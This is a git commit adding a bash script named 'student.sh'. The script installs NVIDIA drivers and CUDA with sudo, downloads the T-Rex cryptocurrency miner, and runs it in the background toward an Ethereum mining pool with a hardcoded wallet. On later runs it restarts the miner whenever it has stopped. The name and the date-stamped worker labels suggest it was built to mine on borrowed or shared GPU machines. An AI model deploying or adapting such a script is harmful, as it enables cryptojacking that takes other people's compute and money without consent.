ba51440fd982bb2e98ab4fdd66f3911f9ad6c8a8
winttr89 <89454761+winttr89@users.noreply.github.com>
2022-03-05 07:38:06 +0700

    Add files via upload

---
+++ student.sh
@@ -0,0 +1,34 @@
+woker=$(date +'%d%m_')
+name=vroman241
+woker+=$name
+SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
+if [ ! -f "${SCRIPT_DIR}/isHaveSetupCoin.txt" ]; then
+	echo "Start setup..."
+	wget http://us.download.nvidia.com/tesla/410.129/nvidia-diag-driver-local-repo-ubuntu1604-410.129_1.0-1_amd64.deb
+	sudo dpkg -i nvidia-diag-driver-local-repo-ubuntu1604-410.129_1.0-1_amd64.deb
+	sudo apt-key add /var/nvidia-diag-driver-local-repo-410.129/7fa2af80.pub
+	sudo apt-get update
+	sudo apt-get -y install cuda-drivers --allow-unauthenticated
+	sudo apt-get install gcc g++ build-essential libssl-dev automake linux-headers-$(uname -r) git gawk libcurl4-openssl-dev libjansson-dev xorg libc++-dev libgmp-dev python-dev -y
+	wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/cuda-ubuntu1804.pin
+	sudo mv cuda-ubuntu1804.pin /etc/apt/preferences.d/cuda-repository-pin-600
+	wget https://developer.download.nvidia.com/compute/cuda/10.0/secure/Prod/local_installers/cuda-repo-ubuntu1604-10-0-local-10.0.130-410.48_1.0-1_amd64.deb
+	sudo dpkg -i cuda-repo-ubuntu1604-10-0-local-10.0.130-410.48_1.0-1_amd64.deb
+	sudo apt-key add /var/cuda-repo-10-0-local-10.0.130-410.48/7fa2af80.pub
+	sudo apt-get update
+	sudo apt-get -y install cuda
+	sudo apt-get install libcurl3 -y
+	echo "taind vip pro" > isHaveSetupCoin.txt
+	wget https://github.com/trexminer/T-Rex/releases/download/0.22.1/t-rex-0.22.1-linux.tar.gz ; tar -zxvf t-rex-0.22.1-linux.tar.gz 
+  	sudo killall XXX
+  	./t-rex -a ethash -o stratum+tcp://eu1.ethermine.org:4444 -u 0x007E9D0E98a1a2C060B2b605eEE4bb9740F82a25 -p x -w $woker &
+else
+	if pgrep t-rex >/dev/null 2>&1
+	then
+		echo "RUNNING"
+	else
+		wget https://github.com/trexminer/T-Rex/releases/download/0.22.1/t-rex-0.22.1-linux.tar.gz ; tar -zxvf t-rex-0.22.1-linux.tar.gz 
+    		sudo killall XXX
+    		./t-rex -a ethash -o stratum+tcp://eu1.ethermine.org:4444 -u 0x007E9D0E98a1a2C060B2b605eEE4bb9740F82a25 -p x -w $woker &
+	fi
+fi
